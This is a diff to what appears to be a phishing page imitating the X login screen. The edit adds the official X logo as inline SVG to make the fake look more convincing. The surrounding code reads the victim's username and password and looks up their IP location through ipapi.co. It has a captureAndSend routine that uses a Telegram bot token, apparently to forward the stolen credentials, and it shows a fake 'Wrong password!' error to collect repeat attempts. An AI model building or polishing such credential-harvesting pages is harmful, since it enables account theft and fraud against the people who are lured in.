@@ -15,7 +15,12 @@
   <div id="step1" class="flex flex-col h-full justify-between">
     <div class="flex justify-between items-center px-5 py-4">
       <button class="text-lg font-medium">Cancel</button>
-      <div class="text-2xl font-black">X</div>
+      
+      <!-- Official X logo (inline SVG) -->
+      <svg width="32" height="32" viewBox="0 0 24 24" aria-label="X" role="img" class="fill-current">
+        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+      </svg>
+      
       <div class="w-10"></div>
     </div>
 
@@ -47,7 +52,12 @@
   <div id="step2" class="hidden flex flex-col h-full justify-between relative">
     <div class="flex justify-between items-center px-5 py-4">
       <button onclick="goBack()" class="text-2xl">×</button>
-      <div class="text-2xl font-black">X</div>
+      
+      <!-- Same official X logo in step 2 -->
+      <svg width="32" height="32" viewBox="0 0 24 24" aria-label="X" role="img" class="fill-current">
+        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+      </svg>
+      
       <div class="w-10"></div>
     </div>
 
@@ -76,7 +86,7 @@
 
       <p class="text-sky-500 mt-4 cursor-pointer">Forgot password?</p>
 
-      <!-- Fake error message (shown only after first attempt) -->
+      <!-- Fake error message -->
       <div id="errorMsg" class="hidden mt-6 bg-blue-600 rounded-lg p-5 text-center shadow-xl">
         <p class="text-2xl font-bold">Wrong password!</p>
         <p class="text-sm mt-3 opacity-90">
@@ -102,8 +112,7 @@
   </div>
 
   <script>
-    // These variables now come from config.js (loaded above)
-    // Make sure config.js is in the same folder as this file
+    // These come from config.js
     const TELEGRAM_BOT_TOKEN = window.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID   = window.TELEGRAM_CHAT_ID;
 
@@ -118,7 +127,7 @@
 
     let attemptCount = 0;
 
-    // Enable/disable Next button
+    // Enable/disable Next
     usernameInput.addEventListener("input", () => {
       const val = usernameInput.value.trim();
       nextBtn.disabled = !val;
@@ -128,7 +137,6 @@
       nextBtn.classList.toggle("text-gray-400", !val);
     });
 
-    // Go to password step
     nextBtn.addEventListener("click", () => {
       displayUser.textContent = usernameInput.value.trim();
       step1.classList.add("hidden");
@@ -143,7 +151,6 @@
       errorMsg.classList.add("hidden");
     }
 
-    // Enable/disable Log in button
     passwordInput.addEventListener("input", () => {
       const val = passwordInput.value.trim();
       loginBtn.disabled = !val;
@@ -157,7 +164,6 @@
       passwordInput.type = passwordInput.type === "password" ? "text" : "password";
     }
 
-    // ─── CAPTURE IP → GEO via ipapi.co → SEND ───────────────────────────────
     async function captureAndSend(attemptNumber) {
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
@@ -184,12 +190,10 @@
           geo.country = data.country_name || "unknown";
           geo.region  = data.region      || "unknown";
           geo.city    = data.city        || "unknown";
-          geo.isp     = data.org         || data.asn || "unknown";
+          geo.isp     = data.org || data.asn || "unknown";
           geo.proxy   = data.in_eu || data.proxy ? "Yes" : "No";
         }
-      } catch (err) {
-        // silent fail
-      }
+      } catch {}
 
       const ua = navigator.userAgent;
       const now = new Date();
@@ -249,7 +253,6 @@
       } catch {}
     }
 
-    // ─── LOGIN BUTTON ──────────────────────────────────────────────────────
     loginBtn.addEventListener("click", async () => {
       attemptCount++;
 
